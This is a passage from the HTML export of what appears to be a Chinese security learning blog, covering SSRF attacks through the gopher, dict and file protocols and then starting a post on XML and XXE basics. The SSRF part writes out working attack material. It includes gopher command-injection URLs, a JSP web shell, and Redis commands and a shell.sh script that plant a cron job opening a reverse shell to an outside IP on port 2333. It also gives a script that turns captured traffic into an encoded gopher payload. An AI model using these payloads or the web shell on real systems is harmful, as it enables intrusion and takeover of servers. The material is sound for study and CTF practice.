class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>利用gopher协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</strong></p><p><img src="image-20211022123436051.png" alt="image-20211022123436051"></p><p><img src="image-20211022123450214.png" alt="image-20211022123450214"></p><h4 id="gopher协议内部rce"><a href="#gopher协议内部rce" class="headerlink" title="gopher协议内部rce"></a>gopher协议内部rce</h4><pre class="line-numbers language-gopher"><code class="language-gopher">http://192.168.91.130/ssrf.php?url=gopher://localhost:2222/_`whoami`//只有自身服务器监听端口时可以实现任意命令执行//但可以自定义命令，比如可以将执行的命令写入文件，然后进行读取，这样就可以造成rcecurl gopher://localhost:80/_`cat * > 4.txt`//这种情况也不需要刻意的去监控端口，只需要选一个存在的端口发送即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="gopher协议攻击mysql"><a href="#gopher协议攻击mysql" class="headerlink" title="gopher协议攻击mysql"></a>gopher协议攻击mysql</h4><p>一般情况下，mysql都是运行在本地服务器的3306端口下，普通的方法无法防问，但SSRF可以</p><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p><ul><li>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证</li><li>当无需密码认证时直接发送TCP/IP数据包即可</li></ul><p>MySQL客户端与服务器的交互主要分为两个阶段：连接阶段或者叫认证阶段和命令阶段。在连接阶段包括握手包和认证包，我们主要关注认证数据包。</p><p>认证包格式：<br><img src="20191112131647463.png" alt="img"></p><blockquote><p><strong>攻击原理：</strong></p><p>gopher协议可以后接一个TCP数据流</p><p>mysql会通过TCP/IP套接字连接</p><p>所以我们可以自已建立一个和目标大致相仿的数据库，抓取mysql数据包，然后通过gopher协议将伪造的认证包和请求包发送3306端口，即可完成对mysql的攻击</p></blockquote><p>详见：</p><p><code>https://blog.csdn.net/qq_41107295/article/details/103026470</code></p><p>``<a href="https://www.freebuf.com/articles/web/159342.html%60">https://www.freebuf.com/articles/web/159342.html`</a></p><h4 id="gopher攻击Fastcgi"><a href="#gopher攻击Fastcgi" class="headerlink" title="gopher攻击Fastcgi"></a>gopher攻击Fastcgi</h4><p>详见：</p><p><code>https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</code></p><p><code>https://www.jianshu.com/p/565217337247</code></p><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p><p>CGI全称”通用网关接口”（Common Gateway Interface），用于HTTP服务器与其它机器上的程序服务通信交流的一种工具，CGI程序须运行在网络服务器上。</p><p>传统CGI接口方式的主要缺点是性能较差，因为每次HTTP服务器遇到动态程序时都需要重启解析器来执行解析，然后结果被返回给HTTP服务器。这在处理高并发访问几乎是不可用的，因此就诞生了FastCGI。另外传统的CGI接口方式安全性也很差。</p><p>FastCGI是一个可伸缩地、高速地在HTTP服务器和动态脚本语言间通信的接口（FastCGI接口在Linux下是socket（可以是文件socket，也可以是ip socket）），主要优点是把动态语言和HTTP服务器分离开来。</p><blockquote><p>HTTP协议是浏览器和服务器中间件通信的协议，而Fastcgi是服务器中间件和语言后端通信的协议</p><p>这是因为中间件（HTTP服务器）不能动态的解析程序，所以需要Fastcgi来解析动态语言后，再交由http解析</p></blockquote><p>FastCGI的重要特点：</p><ul><li>1、FastCGI是HTTP服务器和动态脚本语言间通信的接口或者工具。</li><li>2、FastCGI优点是把动态语言解析和HTTP服务器分离开来。</li><li>3、Nginx、Apache、Lighttpd以及多数动态语言都支持FastCGI。</li><li>4、FastCGI接口方式采用C/S架构，分为客户端（HTTP服务器）和服务端（动态语言解析服务器）。</li><li>5、PHP动态语言服务端可以启动多个FastCGI的守护进程。</li><li>6、HTTP服务器通过FastCGI客户端和动态语言FastCGI服务端通信。</li></ul><blockquote><p>攻击要点</p><ul><li>libcurl版本&gt;=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断)</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul></blockquote><h3 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h3><p>字典服务器协议。dict是基于查询相应的TCP协议。Dict服务器和客户机使用TCP端口2628，允许客户端在使用过程中访问更多字典。。漏洞代码没有屏蔽回显的情况下，可以利用dict协议获取ssh等服务版本信息。</p><p>在SSRF攻击中，gopher协议是最好用的，但gopher协议又自己的使用条件</p><p><img src="1937992-20200527101703916-1706063347.png" alt="img"></p><p><strong>利用dict协议可以探测端口的开放情况和指纹信息</strong></p><p>dict协议语法：</p><pre class="line-numbers language-dict"><code class="language-dict">dict://serverip:port/命令:参数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload示例：</p><pre class="line-numbers language-payload"><code class="language-payload">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果ssrf.php中加上一行屏蔽回显的代码<code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。</p><blockquote><p>注意：dict协议后跟的命令可以直接被某些服务执行，比如redis</p></blockquote><h3 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h3><p>本地文件传输协议，主要用于访问本地计算机中的文件。</p><p>因为SSRF攻击的本质就是从外网攻击内网，所以只要函数支持file协议，那么file协议就可以读到文件</p><p><img src="image-20211001115341285.png" alt="image-20211001115341285"></p><h3 id="http-s"><a href="#http-s" class="headerlink" title="http/s"></a>http/s</h3><p>主要用来探测内网服务。根据响应的状态判断内网端口及服务，可以结合java系列0day和其他各种0day使用。</p><p>这个协议不做细说</p><p><strong>反弹shell部分我写在了<code>https://atmujie.github.io/2021/10/21/%E5%8F%8D%E5%BC%B9shell/</code></strong></p><h1 id="打穿内网（理一下SSRF的攻击思路）"><a href="#打穿内网（理一下SSRF的攻击思路）" class="headerlink" title="打穿内网（理一下SSRF的攻击思路）"></a>打穿内网（理一下SSRF的攻击思路）</h1><p>参考<code>https://www.sqlsec.com/2021/05/ssrf.html</code></p><p>没靶场，摘一下参考文章的说明，具体内容看参考文章</p><p><img src="16205694239190.png" alt="img"></p><p><strong>172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。</strong></p><p>我这里以极客大挑战givemeyourlove为例</p><h2 id="SSRF的判断"><a href="#SSRF的判断" class="headerlink" title="SSRF的判断"></a>SSRF的判断</h2><p><strong>能够对外发起网络请求的地方，就可能存在 SSRF。</strong></p><p><strong>只要可以获取到内网文件，就一定存在SSRF</strong></p><p>例如极客大挑战givemeyourlove</p><p><img src="image-20211021215000591.png" alt="image-20211021215000591"></p><h2 id="读取本地信息"><a href="#读取本地信息" class="headerlink" title="读取本地信息"></a>读取本地信息</h2><p>判断SSRF存在后，接下来就是读取本地的信息进一步判断</p><p>/etc/passwd: 查看是否对内网文件有读取权限</p><p>/etc/hosts: 查看存活主机（内网主机），确认当前资产的网段信息</p><h2 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h2><p>探测内网端口主要方法</p><ul><li><p>nmap扫描：知道内网存活主机ip的情况下，可以使用nmap扫描内网端口</p><p>  参考链接<code>https://blog.51cto.com/lee90/1858381</code></p></li><li><p>dict协议探测：SSRF常配合DICT协议探测内网端口，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口</p></li><li><p>BP 下使用迭代器模式爆破，设置好要爆破的 IP 和 端口即可批量探测出端口开放的信息</p></li></ul><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>在得知存活主机的端口后，就可以对其进行目录扫描，寻找可以攻击的漏洞点</p><p><img src="image-20211022123037938.png" alt="image-20211022123037938"></p><p>然后在攻击点执行getshell等一系列的攻击操作</p><h2 id="写入shell，getshell"><a href="#写入shell，getshell" class="headerlink" title="写入shell，getshell"></a>写入shell，getshell</h2><p>无论怎么进行SSRF攻击内网，最后的一步操作大多是写入shell控制对方内网主机</p><p>就拿参考文章的例子来说</p><pre class="line-numbers language-jsp"><code class="language-jsp"><%    String command = request.getParameter("cmd");    if(command != null)    {        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();        int a = -1;        byte[] b = new byte[2048];        out.print("<pre>");        while((a=in.read(b))!=-1)        {            out.println(new String(b));        }        out.print("</pre>");    } else {        out.print("format: xxx.jsp?cmd=Command");    }%><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个一个jsp的小马</p><p><a href="https://github.com/vulhub/vulhub/blob/master/tomcat/CVE-2017-12615/README.zh-cn.md">Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</a></p><p>将小马通过这个漏洞写入被攻击方服务器，然后执行，就是一个写入getshell的过程</p><pre class="line-numbers language-bash"><code class="language-bash">auth 123123flushallconfig <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron/config <span class="token keyword">set</span> dbfilename root<span class="token keyword">set</span> x <span class="token string">"\n* * * * * /bin/bash -i >&amp; /dev/tcp/1.15.225.114/2333 0>&amp;1\n"</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="SSRF攻击redis"><a href="#SSRF攻击redis" class="headerlink" title="SSRF攻击redis"></a>SSRF攻击redis</h1><blockquote><p>SSRF攻击redis有两种类型</p><p>1、无需密码（未授权攻击）</p><p>2、需要密码</p></blockquote><h2 id="构造数据包攻击"><a href="#构造数据包攻击" class="headerlink" title="构造数据包攻击"></a>构造数据包攻击</h2><p>无论需不需要密码，都可以构建数据包进行攻击，这也是所有基于gopher协议的SSRF攻击通用的一点</p><p>流程：</p><p>1、先写一个.sh脚本，执行redis命令反弹shell</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#shell.sh</span><span class="token keyword">echo</span> -e <span class="token string">"\n\n\n*/1 * * * * bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&amp;1\n\n\n"</span><span class="token operator">|</span>redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> -x <span class="token keyword">set</span> 1/*在redis第0个数据库添加key为1，value为反弹shell语句的字段*//*echo -e 处理特殊字符，若字符串中出现特殊字符【如\n】，则加以处理，不会将它当成一般文字输出*/redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> config <span class="token keyword">set</span> <span class="token function">dir</span> /var/spool/cron/redis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> config <span class="token keyword">set</span> dbfilename rootredis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> saveredis-cli -h <span class="token variable">$1</span> -p <span class="token variable">$2</span> quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="socat转发获取TCP包"><a href="#socat转发获取TCP包" class="headerlink" title="socat转发获取TCP包"></a>socat转发获取TCP包</h3><blockquote><p><em>socat是一个多功能的网络工具</em></p><pre class="line-numbers language-socat"><code class="language-socat">语法：socat [options] <address> <address><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Socat 所做的工作就是在 2 个 address 指定的描述符间建立一个 pipe 用于发送和接收数据。</p><p>参考地址：<code>http://linux.51yip.com/search/socat</code></p></blockquote><p><img src="image-20211023203621333.png" alt="image-20211023203621333"></p><p><img src="image-20211023203911140.png" alt="image-20211023203911140"></p><pre class="line-numbers language-bash"><code class="language-bash">socat -v tcp-listen:2333,fork tcp:localhost:6379-v 将中转的数据流明文显示tcp-listen:2333,fork 监听端口2333,选项为转发tcp:localhost:6379 转发地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后再开个页面运行命令脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> shell.sh 127.0.0.1 2333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211023211350543.png" alt="image-20211023211350543"></p><p>上图ERR是我服务器redis配置有问题，删OK的时候把它也删除就行</p><h3 id="说一下SAVE失败的坑"><a href="#说一下SAVE失败的坑" class="headerlink" title="说一下SAVE失败的坑"></a>说一下SAVE失败的坑</h3><p>这里顺便说一下，这是一个坑</p><p><strong>我这里是新下载的redis，默认工作路径是<code>/var/lib/redis</code></strong></p><p><img src="image-20211024104019914.png" alt="image-20211024104019914"></p><p><strong>然而我们攻击时反弹shell和写入shell分别需要执行<code>config set dir /var/spool/cron/</code>和<code>config set /var/www/html/</code></strong></p><p><strong>redis 对这几个目录均无读写权限，所以一但执行就会导致save命令报错</strong></p><p><img src="image-20211024104816975.png" alt="image-20211024104816975"></p><p>可以看到，上面save返回OK，下面报错</p><p>百度好半天都没解决，我就看了下日志</p><p><img src="image-20211024140110992.png" alt="image-20211024140110992"></p><p>复制日志又半天，还是不行</p><p>仔细一寻思，好像大部分目录都没可写权限，包括html</p><p>然后</p><p><img src="image-20211024140550064.png" alt="image-20211024140550064"></p><p>很好，成功被百度浪费一早上</p><p><strong>这次复现成功让我明白了，SSRF攻击redis看似炫酷，实际和sql写马一样，鸡肋</strong></p><p><strong>都需要特定的条件，redis为</strong></p><blockquote><p><strong>权限777的目录【或者本就能文件上传的目录】</strong></p><p><strong>或者root身份运行redis</strong></p><p>如图，默认是redis用户身份</p><p><img src="image-20211024142633540.png" alt="image-20211024142633540"></p></blockquote><blockquote><p>解决方式：通过root用户使用redis-server启动redis</p></blockquote><pre class="line-numbers language-bash"><code class="language-bash">redis-server /etc/redis/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20211024155017742.png" alt="image-20211024155017742"></p><h3 id="转换规则："><a href="#转换规则：" class="headerlink" title="转换规则："></a>转换规则：</h3><p>分别对每一行进行筛选</p><ul><li>如果单行第一个字符是<code>&gt;</code>或者<code>&lt; </code>那么丢弃该行字符串，该行是请求和返回的时间。</li><li>如果单行前3个字符是<code>+OK</code> 那么丢弃该行字符串，该行是返回的字符串。</li><li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li><li>空白行替换为<code>%0a</code></li></ul><p>可以写python进行处理，这里引用参考文章的脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#用法: python tran2gopher.py socat.log</span><span class="token comment" spellcheck="true">#coding: utf-8</span><span class="token comment" spellcheck="true">#author: JoyChou</span><span class="token keyword">import</span> sysexp <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">with</span> open<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">'>&lt;+'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">'?'</span><span class="token punctuation">:</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> line            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token comment" spellcheck="true"># 判断倒数第2、3字符串是否为\r</span>        <span class="token keyword">elif</span> line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token string">'\r'</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果该行只有\r，将\r替换成%0a%0d%0a</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>line<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a%0d%0a'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>r<span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'%0d%0a'</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># 去掉最后的换行符</span>                line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                exp <span class="token operator">=</span> exp <span class="token operator">+</span> line        <span class="token comment" spellcheck="true"># 判断是否是空行，空行替换为%0a</span>        <span class="token keyword">elif</span> line <span class="token operator">==</span> <span class="token string">'\x0a'</span><span class="token punctuation">:</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> <span class="token string">'%0a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            exp <span class="token operator">=</span> exp <span class="token operator">+</span> lineexp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"%24"</span><span class="token punctuation">)</span>exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"%3C"</span><span class="token punctuation">)</span>exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"%3E"</span><span class="token punctuation">)</span>exp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"%3F"</span><span class="token punctuation">)</span><span class="token keyword">print</span> exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-payload"><code class="language-payload">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将处理后的数据拼接gopher://xxx.xxx.xxx.xxx/_进行url编码</p><p><img src="image-20211024143019099.png" alt="image-20211024143019099"></p><p>全OK代表成功</p><p><img src="image-20211024143152157.png" alt="image-20211024143152157"></p><p>这里是写入一句话的脚本</p><p>需要密码在最开始写上就行</p><p><img src="image-20211024143251711.png" alt="image-20211024143251711"></p><h2 id="工具攻击"><a href="#工具攻击" class="headerlink" title="工具攻击"></a>工具攻击</h2><p>这个就多了，无密码自然用Gopherus ，有密码用 redis-ssrf</p><p><strong>redis-ssrf：<code>https://github.com/xmsec/redis-ssrf</code></strong></p><p><strong>这个工具需要redis-rogue-server提供exp.so<code>https://github.com/n0b0dyCN/redis-rogue-server</code></strong></p><p><strong>Gopherus:  <code>https://github.com/tarunkant/Gopherus</code></strong></p><p>Gopherus虽然无法对有密码的redis进行payload构建，但它是SSRF的万金油工具，攻击fastcgi、mysql都可以用</p><p>工具用法就不解释了</p><h2 id="对PHP运行模式的补充"><a href="#对PHP运行模式的补充" class="headerlink" title="对PHP运行模式的补充"></a>对PHP运行模式的补充</h2><h3 id="中间件三种运行方式"><a href="#中间件三种运行方式" class="headerlink" title="中间件三种运行方式"></a>中间件三种运行方式</h3><p>这点上面也写了，不过现在看实在是写的垃圾，所以这里简单解释一下</p><blockquote><p>一、我们都知道网页是以http协议或者https传输的</p></blockquote><p>当外部访问服务器php网站时，请求并不是直接交给程序处理，而是先交给中间服务器，也就是中间件</p><p>比如Nginx、Apache</p><p>取张参考文章的图</p><p><img src="1.png" alt="img"></p><p>数据到达中间件后，http数据被解析，这时数据有三种办法去往php</p><blockquote><p>apache2-module模式</p></blockquote><p>把 php 当做 apache 的一个模块，实际上 php 就相当于 apache 中的一个 dll 或一个 so 文件，phpstudy 的非 nts 模式就是默认以 module 方式连接的。</p><blockquote><p>CGI模式</p></blockquote><p>此时 php 是一个独立的进程，中间件也是一个独立的进程，然后当中间件监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给 cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给中间件，最后中间件返回到客户端</p><blockquote><p>FastCGI模式</p></blockquote><p>Fastcgi是对Cgi的优化，本质也是Cgi</p><h3 id="FastCGI两种通信方式"><a href="#FastCGI两种通信方式" class="headerlink" title="FastCGI两种通信方式"></a>FastCGI两种通信方式</h3><p>在PHP使用FastCGI连接模式的情况下，中间件和PHP-FPM之间的通信方式又分为两种：</p><blockquote><p>TCP模式</p></blockquote><p>TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后中间件会把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。</p><blockquote><p>Unix Socket模式</p></blockquote><p>Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。</p><p>相比之下，Unix套接字模式的性能会优于TCP模式。</p><p>这个运行模式有点类似Linux系统对文件描述符的调用</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XEE漏洞学习</title>
      <link href="/2021/09/17/XEE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/09/17/XEE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE——外部实体注入概述"><a href="#XXE——外部实体注入概述" class="headerlink" title="XXE——外部实体注入概述"></a>XXE——外部实体注入概述</h1><p><strong>XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击</strong></p><blockquote><p>概述</p></blockquote><p>XML 被设计用来传输和存储数据。</p><p>HTML 被设计用来显示数据。</p><p>XML 不会替代 HTML，理解这一点很重要。在大多数 Web 应用程序中，XML 用于传输数据，而 HTML 用于格式化并显示数据。</p><h2 id="XML语法规则"><a href="#XML语法规则" class="headerlink" title="XML语法规则"></a>XML语法规则</h2><ul><li><p>xml 必须包含根元素，它是所有其他元素的父元素，比如以下实例中 root 就是根元素：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span> //文档开头必须<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>child</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>subchild</span><span class="token punctuation">></span></span>.....<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>subchild</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>child</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在 XML 中，省略关闭标签是非法的。所有元素都<strong>必须</strong>有关闭标签</p></li><li><p>XML 标签对大小写敏感。标签 <Letter> 与标签 <letter> 是不同的。必须使用相同的大小写来编写打开标签和关闭标签</p></li><li><p>在 XML 中，所有元素都<strong>必须</strong>彼此正确地嵌套</p></li><li><p>XML的注释同html</p></li><li><p>XML中空格会被保留，而HTML会把多个字符裁剪为一个</p></li><li><p><strong>XML的标签可以自定义，就是说可以随便改</strong></p></li><li><p><strong>XML 的属性值必须加引号</strong></p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span> <span class="token attr-name">date</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>12/11/2007<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>简单来说就是xml语法基本同html，但是远比html要严格</p><h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><p>在 XML 中，一些字符拥有特殊的意义。</p><p>如果您把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p><blockquote><p><strong>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</strong></p></blockquote><p>为了避免这个错误，需要<strong>实体引用</strong>来代替 “&lt;” 字符：</p><pre class="line-numbers language-xml"><code class="language-xml">在 XML 中，有 5 个预定义的实体引用<span class="token entity" title="&lt;">&amp;lt;</span>    &lt;    小于<span class="token entity" title="&gt;">&amp;gt;</span>    >    大于<span class="token entity" title="&amp;">&amp;amp;</span>    &amp;    &amp;符<span class="token entity" title="&apos;">&amp;apos;</span>    '    单引<span class="token entity" title="&quot;">&amp;quot;</span>    "    双引<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>在 Windows 应用程序中，换行通常以一对字符来存储：回车符（CR）和换行符（LF）。</p><p>  在 Unix 和 Mac OSX 中，使用 LF 来存储新行。</p><p>  在旧的 Mac 系统中，使用 CR 来存储新行。</p><p>  XML 以 LF 存储换行。</p></li></ul><blockquote><p><strong>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成</strong></p></blockquote><h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p><p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。</p><blockquote><p>内部DTD</p></blockquote><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span> //声明xml版本<span class="token doctype">&lt;!DOCTYPE note [   //声明此文档是note类型的文档&lt;!ELEMENT note (to,from,heading,body)></span>  //声明此文档的所有元素<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  //定义to元素的类型为PCDATA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  // 定义from元素类型为PCDATA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span> // 定义heading为PCDATA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  // 定义body为PCDATA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">"hello</span> <span class="token attr-name">world"</span><span class="token 